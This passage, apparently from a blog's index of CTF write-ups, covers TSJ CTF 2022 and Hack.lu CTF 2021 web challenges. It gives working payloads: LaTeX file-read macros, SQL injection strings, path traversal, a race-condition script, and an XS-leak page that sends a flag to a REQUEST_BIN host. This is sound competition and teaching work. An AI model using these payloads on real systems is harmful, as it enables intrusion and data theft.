Genie.config.session_key_name)) \u0026amp;\u0026amp; return Genie.Cookies.get(payload, Genie.config.session_key_name) id() end# https://github.com/GenieFramework/Genie.jl/blob/v4.15.2/src/Cookies.jl#L28-L42 \u0026#34;\u0026#34;\u0026#34; get(res::HTTP.Response, key::Union{String,Symbol}) :: Union{Nothing,String} Retrieves a value stored on the cookie as `key` from the `Respose` object. # Arguments - `payload::Union{HTTP.Response,HTTP.Request}`: the request or response object containing the Cookie headers - `key::Union{String,Symbol}`: the name of the cookie value - `encrypted::Bool`: if `true` the value stored on the cookie is automatically decrypted \u0026#34;\u0026#34;\u0026#34; function get(res::HTTP.Response, key::Union{String,Symbol}; encrypted::Bool = true) :: Union{Nothing,String} (haskey(HTTPUtils.Dict(res), \u0026#34;Set-Cookie\u0026#34;) || haskey(HTTPUtils.Dict(res), \u0026#34;set-cookie\u0026#34;)) ? nullablevalue(res, key, encrypted = encrypted) : nothing end# https://github.com/GenieFramework/Genie.jl/blob/v4.15.2/src/Cookies.jl#L135-L157 \u0026#34;\u0026#34;\u0026#34; nullablevalue(payload::Union{HTTP.Response,HTTP.Request}, key::Union{String,Symbol}; encrypted::Bool = true) Attempts to retrieve a cookie value stored at `key` in the `payload object` and returns a `Union{Nothing,String}` # Arguments - `payload::Union{HTTP.Response,HTTP.Request}`: the request or response object containing the Cookie headers - `key::Union{String,Symbol}`: the name of the cookie value - `encrypted::Bool`: if `true` the value stored on the cookie is automatically decrypted \u0026#34;\u0026#34;\u0026#34; function nullablevalue(payload::Union{HTTP.Response,HTTP.Request}, key::Union{String,Symbol}; encrypted::Bool = true) :: Union{Nothing,String} for cookie in split(Dict(payload)[\u0026#34;cookie\u0026#34;], \u0026#39;;\u0026#39;) cookie = strip(cookie) if startswith(lowercase(cookie), lowercase(string(key))) value = split(cookie, \u0026#39;=\u0026#39;)[2] |\u0026gt; String encrypted \u0026amp;\u0026amp; (value = Genie.Encryption.decrypt(value)) return string(value) end end nothing end# https://github.com/GenieFramework/Genie.jl/blob/v4.15.2/src/Encryption.jl#L24-L35 \u0026#34;\u0026#34;\u0026#34; decrypt(s::String) :: String Decrypts `s` (a `string` previously encrypted by Genie). \u0026#34;\u0026#34;\u0026#34; function decrypt(s::String) :: String (key32, iv16) = encryption_sauce() decryptor = Nettle.Decryptor(ENCRYPTION_METHOD, key32) deciphertext = Nettle.decrypt(decryptor, :CBC, iv16, s |\u0026gt; hex2bytes) String(Nettle.trim_padding_PKCS5(deciphertext)) end# https://github.com/JuliaCrypto/Nettle.jl/blob/v0.5.0/src/cipher.jl#L90-L93 function trim_padding_PKCS5(data::Vector{UInt8}) padlen = data[sizeof(data)] return data[1:sizeof(data)-padlen] end In short, __geniesid is the ciphertext of the relative path for the session file. It uses the decryptor from Nettle.jl to decrypt ciphertext with AES-CBC and unpad. Notably, Nettle.jl's unpad it reads the last character (denoted by $\\rho$) and simply remove the last $\\rho$ characters from the plaintext. It does not checks if the padding is correct under PKCS5.\nSince the session ID is 64 characters long, the ciphertext would be 80 bytes long. In particular, if $c_4$ and $c_5$ represents the fourth and the fifth blocks and $\\text{pad}$ is 10 10 ... 10, we have:\n\\[\\text{Enc}(c_4 \\oplus \\text{pad}) = c_5\\]\nIf we flip the last byte of $c_4$ by 0x10 XOR 0x4f, we would obtain a plaintext which is the first byte of the current plaintext. After all, we have the following algorithm:\n Upload 16 malicious sessions to ../uploads/0, ../uploads/1, ..., ../uploads/f (yes, @grhkm was correct.) Get a session and flip the last byte of $c_4$ by 0x5f = 0x10 XOR 0x4f. We then have the session ID being 0, 1, ..., or f, which will point to the malicious session. Use the malicious session and visit a page. Read the flag at http://[HOST]/uploads/flag  I will write a blog post on the cryptographic details later.  Remote Code TeXecution 1 Solved by harrier and Ozetta; writeup compiled by Ozetta.\nWhen I was attempting this challenge, the source code was not released.\nFew months ago some of our team member added a Discord Bot called \u0026quot;TeXit\u0026quot; to render LaTeX output on Discord... lol it just looks too similar to the current challenge. A day after the Bot is introduced, I managed to craft a payload that can read any files on the server and steal other user's output. The bug is reported to the developers of TeXit and they replied that it is an expected behavior. Well looks like we have some endowment to use for this challenge:\n\\makeatletter \\def\\protected@iwrite#1#2#3{% \\begingroup\\set@display@protect #2% local assignments \\immediate\\write#1{#3}\\endgroup} \\newwrite\\tempfile \\immediate\\openout\\tempfile=z.tex \\protected@iwrite\\tempfile{}{\\protect\\begin{verbatim}} \\newread\\file \\openin\\file=../(Discord_User_ID)/(Discord_User_ID).tex \\newcount\\foo \\foo=0 \\loop\\unless\\ifeof\\file \\advance \\foo +1 \\read\\file to\\fileline \\ifnum \\foo \u0026gt; 53 \\protected@iwrite\\tempfile{}{\\fileline} \\fi \\repeat \\closein\\file The funny \u0026gt;53 is to remove the headers added by the Bot, and we will see later on that it is very useful in this challenge. So I just replace the filename in our old payload to check /proc/self/stat. It shows\nError The bot thinks your file is insecure backslash detected! I also tried /proc/self/exe and it shows\nCompilation failed ! Text line contains an invalid character. \u0026lt;read 2\u0026gt; ^^? ELF^^B^^A^^A^^@^^@^^@^^@^^@^^@^^@^^@^^@^^C^^@\u0026gt;^^@^^A^^@^^@^^@@!^... l.21 \\repeat ? ! Emergency stop. \u0026lt;read 2\u0026gt; ^^? ELF^^B^^A^^A^^@^^@^^@^^@^^@^^@^^@^^@^^@^^C^^@\u0026gt;^^@^^A^^@^^@^^@@!^... l.21 \\repeat ! ==\u0026gt; Fatal error occurred, no output PDF file produced! Transcript written on output.log. Output PDF not found. And /proc/self/cmdline shows\n! Text line contains an invalid character. \u0026lt;read 2\u0026gt; pdflatex^^@ -no-shell-escape^^@-jobname^^@output^^@__document.tex^^@ l.21 \\repeat ? ! Emergency stop. \u0026lt;read 2\u0026gt; pdflatex^^@ -no-shell-escape^^@-jobname^^@output^^@__document.tex^^@ l.21 \\repeat ! ==\u0026gt; Fatal error occurred, no output PDF file produced! Transcript written on output.log. Output PDF not found. Thanks it is pdflatex, I should know that already based on the experience from TeXit.\nLooks like it only got output whenever there is an error. So those verbatim tricks from the old payload didn't work well. I just left the challenge alone and after the author released a hint about procfs, probably we are still on the right track... Then after that I found a shit way to force the error output:\n\\PackageError{mypackage}{\\fileline}{asdf}\nSo instead of writing to a tempfile, we can throw exception like this to see the output. I am too lazy so I just add one extra line like this lol:\n\\makeatletter \\def\\protected@iwrite#1#2#3{% \\begingroup\\set@display@protect #2% local assignments \\immediate\\write#1{#3}\\endgroup} \\newwrite\\tempfile \\immediate\\openout\\tempfile=z.tex \\newread\\file \\openin\\file=/proc/self/stat \\newcount\\foo \\foo=0 \\loop\\unless\\ifeof\\file \\advance \\foo +1 \\read\\file to\\fileline \\ifnum \\foo \u0026gt; 0 \\PackageError{zzz}{\\fileline}{xxx} \\protected@iwrite\\tempfile{}{\\fileline} \\fi \\repeat \\closein\\file \\immediate\\closeout\\tempfile \\input{z.tex} Reading /proc/self/stat gives this:\n! Package zzz Error: 16150 (pdflatex) R 16149 16145 16145 0 -1 4194560 4455 0 0 0 6 0 0 0 20 0 1 0 14499616 104087552 5380 18446744073709551615 94604983250944 94604984547965 140730182785440 0 0 0 0 0 2 0 0 0 17 3 0 0 0 0 0 94604984940784 94604985236168 94605006471168 140730182790653 140730182790710 140730182790710 140730182791142 0 . I guess there is a script that spawns the pdflatex, so reading the parent process' cmdline should shows the source path. Upload another file and render again gives another pid that is 11 more than the previous one. So let's say we have pid 16150 for /proc/self/stat (from the previous example), we should leak /proc/16160/cmdline to see the source code path. Then this is what we get:\n! Text line contains an invalid character. \u0026lt;read 2\u0026gt; /bin/sh^^@ -c^^@pdflatex -no-shell-escape -jobname output __document... l.21 \\repeat Thanks it is /bin/sh! Should we find the flag inside? lol Then we check the parent process' id of that sh(it):\n! Package zzz Error: 16292 (sh) S 16290 16288 16288 0 -1 4194304 68 0 0 0 0 0 0 0 20 0 1 0 14551347 2478080 128 18446744073709551615 94814411878400 9481441195 3821 140730404898032 0 0 0 0 0 65538 1 0 0 17 4 0 0 0 0 0 94814411984688 948144 11989568 94814436925440 140730404900389 140730404900477 140730404900477 1407304 04900848 0 . Got a difference of 2, so next time maybe just 11-1-2 = 8, which actually gives this shit:\n/usr/bin/make^^@ -s^^@-C^^@sandbox/ffdb9e807e2ef8fd656b_236028595565... l.21 \\repeat Haiya why not just brute force... ok the difference is 9:\n! Text line contains an invalid character. \u0026lt;read 2\u0026gt; python3^^@ /workdir/YVvIaGD52z09nIZzXzvB.py^^@ l.21 \\repeat Finally we got the source code's path. Then to leak the source code (well I am not aware of the source code is released by the author at the moment), we can do it line by line... But I don't want so I just copied a string concat macro:\n\\makeatletter \\def\\protected@iwrite#1#2#3{% \\begingroup\\set@display@protect #2% local assignments \\immediate\\write#1{#3}\\endgroup} \\def\\mystring{} % initialize \\def\\extendmystring#1#2{\\edef\\mystring{#1\\mystring#2}} \\newwrite\\tempfile \\immediate\\openout\\tempfile=z.tex \\newread\\file \\openin\\file=/workdir/YVvIaGD52z09nIZzXzvB.py \\newcount\\foo \\foo=0 \\loop\\unless\\ifeof\\file \\advance \\foo +1 \\read\\file to\\fileline \\ifnum \\foo \u0026gt; 0 \\ifnum \\foo \u0026lt; 10 \\extendmystring{}{\\fileline} \\extendmystring{}{FUCK} \\fi \\fi \\repeat \\PackageError{zzz}{\\mystring}{xxx} \\closein\\file \\immediate\\closeout\\tempfile \\input{z.tex} so the output should be a FUCK-separated text of the source code. And I keep requesting the Bot to leak the source code for about 20 lines at a time. Then the single quotes on lines 23 and 44 break the output. So I have to skip these lines manually. Finally I got a different error message from line 171, so looks like it is EOF? Or the # comment character breaks the output again. Then I went back to the team Discord channel to see what's going on and found that our team member harrier has already found the flag on line 171 quickly by viewing the released code.\nHere is the final payload to fix the #, using the catcode command to change the category of # char to be \u0026quot;other\u0026quot; so it doesnt get rendered badly:\n\\makeatletter \\def\\protected@iwrite#1#2#3{% \\begingroup\\set@display@protect #2% local assignments \\immediate\\write#1{#3}\\endgroup} \\def\\mystring{} % initialize \\def\\extendmystring#1#2{\\edef\\mystring{#1\\mystring#2}} \\catcode`\\#=12 \\newwrite\\tempfile \\immediate\\openout\\tempfile=z.tex \\newread\\file \\openin\\file=/workdir/YVvIaGD52z09nIZzXzvB.py \\newcount\\foo \\foo=0 \\loop\\unless\\ifeof\\file \\advance \\foo +1 \\read\\file to\\fileline \\ifnum \\foo \u0026gt; 170 \\ifnum \\foo \u0026lt; 172 \\extendmystring{}{\\fileline} \\extendmystring{}{FUCK} \\fi \\fi \\repeat \\PackageError{zzz}{\\mystring}{xxx} \\closein\\file \\immediate\\closeout\\tempfile \\input{z.tex} lol why you still need to write a tempfile...\n","permalink":"https://b6a.black/posts/2022-03-03-tsjctf/","summary":"We played TSJ CTF last weekend and we won! This is the writeups of our challenges","title":"TSJ CTF 2022 Writeup"},{"content":"Because there are not many Crypto listed in the \u0026quot;Stock Market\u0026quot;, our Cryptotrader Cryptanalyst Mystiz joined us for bounty hunting in Web as well, and we got all Web challenges done this time.\ntrading-api ($285, 20 solves) The objective of this challenge is to get the flag from a PostgreSQL database. First, you need to get an auth token before accessing the API with SQL queries.\n// server.js app.post(\u0026#39;/api/auth/login\u0026#39;, login); // authn.js const r = await got.post(`${AUTH_SERVICE}/api/users/${encodeURI(username)}/auth`, { headers: { authorization: AUTH_API_TOKEN }, json: { password }, }); Well encodeURI not encodeURIComponent? I didn't even bother to read the auth service API and try the username with ../../health? and it works!\nThen there is an annoying checking on the /api/priv/ endpoint:\napp.use(authz({ userPermissions: new Map(Object.entries({ warrenbuffett69: [Permissions.VERIFIED], })), routePermissions: [ [/^\\/+api\\/+priv\\//i, Permissions.VERIFIED], ], })); I thought we need to craft another JWT token (JSON Web Token token?) with the username warrenbuffett69 but apparently we also need a funnier username (../../health? is not funny enough) to do SQLi next.\n(Mystiz actually found the SQLi already because we can bypass this shit) After several hours of fuzzing, none of those .. or weird unicode works as expected. And then I tried to check how express checks the route but I have no idea. Instead I found this: https://github.com/expressjs/express/blob/master/lib/router/index.js#L190\nWhy there is protohost in req.url? Then I tried http://z/api/priv/ (instead of /api/priv/) as the request URL and it works! (Typically, proxy server will accept absolute path as URL1)\nFinally it is the main dish:\napp.put(\u0026#39;/api/priv/assets/:asset/:action\u0026#39;, async (req, res) =\u0026gt; { const { username } = req.user const { asset, action } = req.params; if (/[^A-z]/.test(asset)) { return res.status(400).send(\u0026#39;asset name must be letters only\u0026#39;); } const assetTransactions = transactions[asset] ?? (transactions[asset] = {}); const txId = generateId(); assetTransactions[txId] = action; try { await makeTransaction(username, txId, asset, action === \u0026#39;buy\u0026#39; ? 1 : -1); res.json({ id: txId }); } catch (error) { console.error(\u0026#39;db error:\u0026#39;, error.message); res.status(500).send(\u0026#39;transaction failed\u0026#39;); } finally { delete assetTransactions[txId]; } }); async function makeTransaction(username, txId, asset, amount) { const query = prepare(\u0026#39;INSERT INTO transactions (id, asset, amount, username) VALUES (:txId, :asset, :amount, :username)\u0026#39;, { amount, asset, username, txId, }); await db.query(query); } Uh-oh prepared statement... Let's see how it works:\nfunction sqlEscape(value) { switch (typeof value) { case \u0026#39;string\u0026#39;: return `\u0026#39;${value.replace(/[^\\x20-\\x7e]|[\u0026#39;]/g, \u0026#39;\u0026#39;)}\u0026#39;`; case \u0026#39;number\u0026#39;: return isFinite(value) ? String(value) : sqlEscape(String(value)); case \u0026#39;boolean\u0026#39;: return String(value); default: return value == null ? \u0026#39;NULL\u0026#39; : sqlEscape(JSON.stringify(value)); } } function prepare(query, namedParams) { let filledQuery = query; const escapedParams = Object.fromEntries( Object.entries(namedParams) .map(([key, value]) =\u0026gt; ([key, sqlEscape(value)])) ); for (const key in escapedParams) { filledQuery = filledQuery.replaceAll(`:${key}`, escapedParams[key]); } return filledQuery; } sqlEscape will eat the single quote from your string input (and add a pair of single quote), so changing the username (or asset) to ../../health?' blah will not work. No luck? When you see a lot of Objects[key] (having Object[key1][key2] is the best) in a js challenge, you can try prototype pollution:\nconst assetTransactions = transactions[asset] ?? (transactions[asset] = {}); const txId = generateId(); assetTransactions[txId] = action; which is just like transactions[asset][txId] = action; which fits the Object[key1][key2] form, then we can just fill key1 as __proto__ and we can control asset and action as a string. So we got a prototype pollution on a property of ... a generated ID... but this prototype property will be appeared in escapedParams as well, so if we know the ID (e.g. 1337), then having the username as ../../health? :1337 with action ' blah -- will make the SQL statement looks like\nINSERT INTO transactions (id, asset, amount, username) VALUES (1337, \u0026#39;__proto__\u0026#39;, -1, \u0026#39;../../health? \u0026#39; blah --\u0026#39;) (I know it is broken lol) But how can we get the generated ID? You can't before it shows the result... so instead of putting :1337 as the placeholder, we can put ::txId as the placeholder, so that it will be replaced to the placeholder for the generated ID later.\nTo sum up:\n Get a token with a funny username that contains ::txId, e.g. ../../health? ::txId Access the /api/priv/ endpoint with prototype pollution and SQLi while bypassing the check: PUT http://z/api/priv/assets/__proto__/'%7C%7C(select%09flag%09from%09flag)%7C%7C' HTTP/1.1 Authorization: eySomeToken Host: z ?? Profit  Then you can use the /api/transactions/:id endpoint with the generated ID shown in the transaction result to get the flag.\nBookmarker ($333, 14 solves) Note App + XSS Bot again. But apparently there is no XSS. There is a filter function:\nlet username = req.session.username let {filter} = req.query let query = {username} if(filter){ query.title = { $regex: escapeStringRegexp(filter) } } let items = await Links.find(query).sort({date: -1}) Regular Expression Filter, ReDoS again? But wait there is escapeStringRegexp which seems to be working well. So we need other oracle to check whether the admin's bookmark title (i.e. the flag) contains certain character. Then I found that there is a subtle difference in index.ejs:\n\u0026lt;% if(typeof items != \u0026#39;undefined\u0026#39; \u0026amp;\u0026amp; items.length){ %\u0026gt; \u0026lt;script\u0026gt; window.onload = () =\u0026gt; { document.querySelectorAll(\u0026#39;.deletebtn\u0026#39;).forEach((button)=\u0026gt; { button.onclick = async () =\u0026gt; { // delete link with id  fetch(`/delete?id=${button.dataset.id}`, { method: \u0026#39;GET\u0026#39;, credentials: \u0026#39;include\u0026#39;, }) .then(x =\u0026gt; x.json()) .then((j) =\u0026gt; { console.log(j) }) // remove from dom  button.parentElement.parentElement.parentElement.remove() } }) } \u0026lt;/script\u0026gt; \u0026lt;% } %\u0026gt; That means if the query got no results, it won't include the script for deleting link. Now we can add more security protection to the page, and then we can use our favorite censorship oracle (i.e. Streisand effect) to detect what are the interesting information... lol\nNot blocked:\n\u0026lt;iframe src=\u0026#34;https://bookmarker.flu.xxx/?filter=not_found\u0026#34; csp=\u0026#34;script-src \u0026#39;none\u0026#39;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; Blocked:\n\u0026lt;iframe src=\u0026#34;https://bookmarker.flu.xxx/?filter=found\u0026#34; csp=\u0026#34;script-src \u0026#39;none\u0026#39;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; The oracle here is the blocked one will be loaded relatively faster. By generating N iframes with onload event, the first triggered event will indicate what is the detected character:\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;script\u0026gt; var o = {}; var c = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}\u0026#39;; var payload = \u0026#39;flag{\u0026#39;; var load = 1; function s(){ load = 1; for(i=0;i\u0026lt;64;i++){ q(i); } } function q(x){ o[x] = document.createElement(\u0026#39;iframe\u0026#39;); o[x].src = \u0026#39;https://bookmarker.flu.xxx/?filter=\u0026#39;+payload+c[x]+\u0026#39;\u0026amp;\u0026#39;+Math.random(); o[x].onload = function(){eval(`z(`+x+`);`)}; o[x].csp = \u0026#34;script-src \u0026#39;none\u0026#39;\u0026#34;; document.body.appendChild(o[x]); } function z(x){ document.body.removeChild(o[x]); document.body.innerHTML = \u0026#39;\u0026#39;; if (load) { payload += c[x]; load = 0; } if(x!=63){ setTimeout(\u0026#34;s()\u0026#34;,100); //take a short break lol  } if (x==63){ fetch(\u0026#34;http://REQUEST_BIN/?flag=\u0026#34;+payload, {mode: \u0026#39;no-cors\u0026#39;}); } } onload = s; \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; (Don't ask me how did I name the variables and function names)\nDiamond Safe ($181, 61 solves) The objective is to read /flag.txt, and first you need to login to the system:\nif (isset($_POST[\u0026#39;password\u0026#39;])){ $query = db::prepare(\u0026#34;SELECT * FROM `users` where password=sha1(%s)\u0026#34;, $_POST[\u0026#39;password\u0026#39;]); if (isset($_POST[\u0026#39;name\u0026#39;])){ $query = db::prepare($query . \u0026#34; and name=%s\u0026#34;, $_POST[\u0026#39;name\u0026#39;]); } Prepared statement? Let's see how did it prepare:\npublic static function prepare($query, $args){ if (is_null($query)){ return; } if (strpos($query, \u0026#39;%\u0026#39;) === false){ error(\u0026#39;%s not included in query!\u0026#39;); return; } // get args  $args = func_get_args(); array_shift( $args ); $args_is_array = false; if (is_array($args[0]) \u0026amp;\u0026amp; count($args) == 1 ) { $args = $args[0]; $args_is_array = true; } $count_format = substr_count($query, \u0026#39;%s\u0026#39;); if($count_format !== count($args)){ error(\u0026#39;Wrong number of arguments!\u0026#39;); return; } // escape  foreach ($args as \u0026amp;$value){ $value = static::$db-\u0026gt;real_escape_string($value); } // prepare  $query = str_replace(\u0026#34;%s\u0026#34;, \u0026#34;\u0026#39;%s\u0026#39;\u0026#34;, $query); $query = vsprintf($query, $args); return $query; } Since the statement is prepared twice (one for the password and the other one for username), obviously it is format string placeholder injection. Typically it is injecting %c with value 39 to add one more single quote to break everything, but the above prepare function also checks whether the number of %s and the number of arguments supplied match, so we need to inject another %s if we want to make sure the vsprintf works later.\nFirst, the statement looks like this before prepare on password:\nSELECT * FROM `users` where password=sha1(%s) Let's just set the password as %s, then it will become like this after the vsprintf:\nSELECT * FROM `users` where password=sha1(\u0026#39;%s\u0026#39;) Looks no difference? See where are the single quotes...\nThen we have another prepare statement for the username. Before it prepare:\nSELECT * FROM `users` where password=sha1(\u0026#39;%s\u0026#39;) and name=%s Now you should see what went wrong. Let's say we supply the username as ['foo','bar'], the statement will become:\nSELECT * FROM `users` where password=sha1(\u0026#39;\u0026#39;foo\u0026#39;\u0026#39;) and name=\u0026#39;bar\u0026#39; Looks broken isn't it? Then it is like SQLi 101, just change the foo to some interesting things like ) or 1 --, then you can login:\ncurl https://diamond-safe.flu.xxx/login.php -d \u0026#34;name[]=) or 1 -- \u0026amp;name[]=1\u0026amp;password=%s\u0026#34; -i Next, we want to download the flag. But there is an integrity check on the filename with the hash:\nfunction check_url(){ // fixed bypasses with arrays in get parameters  $query = explode(\u0026#39;\u0026amp;\u0026#39;, $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]); $params = array(); foreach( $query as $param ){ // prevent notice on explode() if $param has no \u0026#39;=\u0026#39;  if (strpos($param, \u0026#39;=\u0026#39;) === false){ $param += \u0026#39;=\u0026#39;; } list($name, $value) = explode(\u0026#39;=\u0026#39;, $param, 2); $params[urldecode($name)] = urldecode($value); } if(!isset($params[\u0026#39;file_name\u0026#39;]) or !isset($params[\u0026#39;h\u0026#39;])){ return False; } $secret = getenv(\u0026#39;SECURE_URL_SECRET\u0026#39;); $hash = md5(\u0026#34;{$secret}|{$params[\u0026#39;file_name\u0026#39;]}|{$secret}\u0026#34;); if($hash === $params[\u0026#39;h\u0026#39;]){ return True; } return False; } Why use the query string instead of $_GET... Looks like a bad excuse for the comment. Anyway we can just keep the original file_name and h in the query string for a valid file, and then add something that can replace the $_GET['file_name']. One way is file name as PHP replaces space with underscore from query string to $_GET:\nhttps://diamond-safe.flu.xxx/download.php?h=f2d03c27433d3643ff5d20f1409cb013\u0026amp;file_name=FlagNotHere.txt\u0026amp;file%20name=../../../flag.txt NodeNB ($198, 45 solves) The objective is to read the note with id flag. However, there is an authorization and you are allowed to read the flag only if either\n you are the owner of the note (there are no owners for the note flag), or you do not have a password (this happens only if you are a system user).  async deleteUser(uid) { const user = await helpers.getUser(uid); await db.set(`user:${user.name}`, -1); await db.del(`uid:${uid}`); // ☝️ Deletes the entire user. The user does not have a password now.  const sessions = await db.smembers(`uid:${uid}:sessions`); const notes = await db.smembers(`uid:${uid}:notes`); return db.del([ ...sessions.map((sid) =\u0026gt; `sess:${sid}`), // ☝️ The sessions are invalidated here  ...notes.map((nid) =\u0026gt; `note:${nid}`), `uid:${uid}:sessions`, `uid:${uid}:notes`, ]); }, Mystiz observed that there is a gap between deleting the user and invalidating the sessions. A user can read arbitrary notes during the time in between. To achieve this, he tried to increase the time by inserting a lot of notes (he attempted to make 1024 notes) and delete the user. Unfortunately he was unable to cast the attack.\nActually there is a sleep function in one of the endpoint that could help us to conduct the race condition attack:\napp.post(\u0026#39;/notes\u0026#39;, ensureAuth, async (req, res) =\u0026gt; { let { title, content } = req.body; if (req.query.random) { const ms = Math.floor(2000 + Math.random() * 1000); await new Promise(r =\u0026gt; setTimeout(r, ms)); So instead of inserting tons of notes (which should work theoretically if the amount is very large), we can just request a few random notes that will sleep for a while. Then we can run delete and read at the same time:\nfor(i=0;i\u0026lt;100;i++){fetch(\u0026#39;/notes?random=1\u0026#39;,{\u0026#39;method\u0026#39;:\u0026#39;POST\u0026#39;,\u0026#39;headers\u0026#39;:{\u0026#39;content-type\u0026#39;:\u0026#39;application/x-www-form-urlencoded\u0026#39;},\u0026#39;body\u0026#39;:\u0026#39;title=\u0026#39;+Math.random()})}; fetch(\u0026#39;/deleteme\u0026#39;,{\u0026#39;method\u0026#39;:\u0026#39;POST\u0026#39;}); fetch(\u0026#39;/notes/flag\u0026#39;).then(e=\u0026gt;e.text()).then(e=\u0026gt;console.log(e)); SeekingExploits ($367, 11 solves) The challenge is written based on an open source forum, MyBB. A plugin called ExploitMarket is implemented. There are two APIs implemented:\n make_proposal makes a proposal delete_proposals clears the proposal of the current user.  Additionally, when a user sends a private message to another user, the list of proposals will be included as a signature.\nThe flag is hidden inside the database. It is hidden in the private notes of the admin. That said, we need to either sign in as an admin (which sounds infeasible for a public CMS) or perform SQL injection.\nIn mybb-server/exploit_market/inc/plugins/emarket.php, there is an obvious SQL injection:\n$user_query = $db-\u0026gt;simple_select(\u0026#34;users\u0026#34;, \u0026#34;username\u0026#34;, \u0026#34;uid=\u0026#34; . $proposal[\u0026#34;additional_info\u0026#34;][\u0026#39;sold_to\u0026#39;]); additional_info is unserialized with my_unserialize and sold_to is used directly without validation. That said, if sold_to is a string, we can easily craft an SQL injection easily (the insert_query function in MyBB simply concatenates the function parameters).\nUnfortunately the fields in additional_info are validated when the content is added. Snippeted:\nfunction validate_additional_info($additional_info) { $validated = array(); foreach($additional_info as $key =\u0026gt; $value) { switch ($key) { case \u0026#34;reliability\u0026#34;: { $value = (int)$value; if ($value \u0026gt;= 0 \u0026amp;\u0026amp; $value \u0026lt;= 100) { $validated[\u0026#34;reliability\u0026#34;] = $value; } break; } case \u0026#34;impact\u0026#34;: { $valid_impacts = array(\u0026#34;rce\u0026#34;, \u0026#34;priv_esc\u0026#34;, \u0026#34;information_disclosure\u0026#34;); if (in_array($value, $valid_impacts, true)) { $validated[\u0026#34;impact\u0026#34;] = $value; } break; } case \u0026#34;current_bidding\u0026#34;: case \u0026#34;sold_to\u0026#34;: { $validated[$key] = (int)$value; break; } default: { $validated[$key] = $value; } } } return $validated; } Although the keys other than reliability, impact, current_bidding and sold_to are not validated and will be added to the return object directly for serialization, only sold_to is shown to the user. It seemed that every other key except sold_to are not important because they do not affect the rendered result... or is it?\nThese (un)serialization will use _safe_unserialize / _safe_serialize, which look safe (as the name suggested lol). Then how can we have a sold_to with SQLi payload after unserialize while bypassing the check during the serialization? Maybe there are some mutation when it writes to the database and reads differently afterwards. A typically case is data truncation in SQL, but the column data type here is TEXT, and also having a left substring of the serialized string seems not very helpful in crafting a nice payload that changes the sold_to later.\nMaybe it is about Multibyte character exploit? Sounds like the infamous 許功蓋 in the 90s. Just randomly add some characters from [\\x80-\\xff] and see what's going on:\nhttp://seekingexploits.flu.xxx/emarket-api.php?action=make_proposal\u0026amp;additional_info[%ee]=1\u0026amp;additional_info[sold_to]=1 This will make the buyer empty (instead of Admin), meaning it breaks the serialized string in some way.\nThen we observe what is the actual serialized string looks like for different cases:\nadditional_info[e%ee]=1\u0026amp;additional_info[sold_to]=1:\na:2:{s:2:\u0026#34;e?;s:1:\u0026#34;1\u0026#34;;s:7:\u0026#34;sold_to\u0026#34;;i:1;} additional_info[%ee%ee]=1\u0026amp;additional_info[sold_to]=1:\na:2:{s:2:\u0026#34;?\u0026#34;;s:1:\u0026#34;1\u0026#34;;s:7:\u0026#34;sold_to\u0026#34;;i:1;} As you can see, the length of first string is the number of bytes we entered but the output may contain something less than that. So basically we need to craft a serialized string that will unserialized to Array(\u0026quot;somejunk1\u0026quot;=\u0026gt;\u0026quot;somejunk2\u0026quot;,\u0026quot;sold_to\u0026quot;=\u0026gt;\u0026quot;payload\u0026quot;)\nHow? I don't know... Just do some trial and error. Before I finish crafting, Mystiz has already got a working payload:\nhttp://seekingexploits.flu.xxx/emarket-api.php?action=make_proposal\u0026amp;additional_info[%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ec]=%22;s:0:%22%22;s:7:%22sold_to%22;s:53:%22-1%20union%20select%20usernotes%20from%20mybb_users%20where%20uid=1\u0026amp;additional_info[%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee]=1\u0026amp;additional_info[%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ef]=2 which looks like\na:3:{s:8:\u0026#34;?;s:82:\u0026#34;\u0026#34;;s:0:\u0026#34;\u0026#34;;s:7:\u0026#34;sold_to\u0026#34;;s:53:\u0026#34;-1 union select usernotes from mybb_users where uid=1\u0026#34;;s:15:\u0026#34;????????;s:1:\u0026#34;1\u0026#34;;s:15:\u0026#34;????????;s:1:\u0026#34;2\u0026#34;;} Looks horrible isn't it? Somehow it includes the serialized string s:7:\u0026quot;sold_to\u0026quot;;s:(some_number):\u0026quot;some_payload\u0026quot; inside one of the input. I personally think that having that s:53 is troublesome. Instead, I tried to have ;s:7:\u0026quot;sold_to as one of the key, and then the value and the value length should be generated automatically...\nhttp://seekingexploits.flu.xxx/emarket-api.php?action=make_proposal\u0026amp;additional_info[%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%eex]=;s:6:\u0026amp;additional_info[;s:7:%22sold_to]=payload(What it interprets) K ************* ******* V ****** ******* a:2:{s:13:\u0026#34;???????\u0026#34;;s:5:\u0026#34;;s:6:\u0026#34;;s:13:\u0026#34;;s:7:\u0026#34;sold_to\u0026#34;;s:7:\u0026#34;payload\u0026#34;;} K ******* ************* V ***** ******* (What I entered)  Mozilla (2021) \u0026quot;HTTP Messages\u0026quot;\nhttps://developer.mozilla.org/en-US/docs/Web/HTTP/Messages [return]   ","permalink":"https://b6a.black/posts/2021-11-04-hacklu-web/","summary":"Because there are not many Crypto listed in the \u0026quot;Stock Market\u0026quot;, our \u003cdel\u003eCryptotrader\u003c/del\u003e Cryptanalyst \u003cem\u003eMystiz\u003c/em\u003e joined us for bounty hunting in Web as well, and we got all Web challenges done this time.","title":"Hack.lu CTF 2021 Web Writeup"},{"content":"Because there are not many Crypto listed in the \u0026quot;Stock Market\u0026quot;, I decided to join our Webb-expert Web-expert Ozetta for bounty hunting in web, and we got all web challenges done this time. The writeup of the web challenges can be found here.\nlwsr ($285, 20 solves) Challenge Summary Suppose that $q = 16411$.\nWhen connected to the server, a LWE private key $s \\in \\mathbb{Z}_q^{128}$ and 384 sets of public key $(p_1, r_1), (p_2, r_2), ..., (p_{384}, r_{384}) \\in \\mathbb{Z}_q^{128} \\times \\mathbb{Z}_q$ are also generated. Also, a LFSR state $t = (t_1, t_2, ..., 